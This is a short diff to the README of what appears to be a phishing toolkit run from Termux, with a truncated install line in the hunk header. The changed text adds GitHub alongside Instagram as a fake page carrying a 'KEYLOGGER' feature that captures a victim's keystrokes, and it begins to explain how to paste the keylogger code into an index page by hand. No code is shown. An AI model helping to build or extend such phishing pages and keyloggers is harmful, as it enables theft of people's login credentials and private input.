@@ -170,7 +170,7 @@ pkg install git python php curl openssh grep && pip3 install wget && git clone h
 **3) KEYLOGGER**
 - Now you will also have the ability to capture all the keystokes of victim.
 
-**(CURRENTLY):- This feature is added only on instagram web page, to less the possibility of slow functioning of generated link)
+**(CURRENTLY):- This feature is added on instagram web page and github, to less the possibility of slow functioning of generated link)
 
 **HOW TO ADD IT MANUALLY ?
 -- You can add this manually by putting the codes on index page.(put these code at anywhere inside the index page // but not between any other script codes)
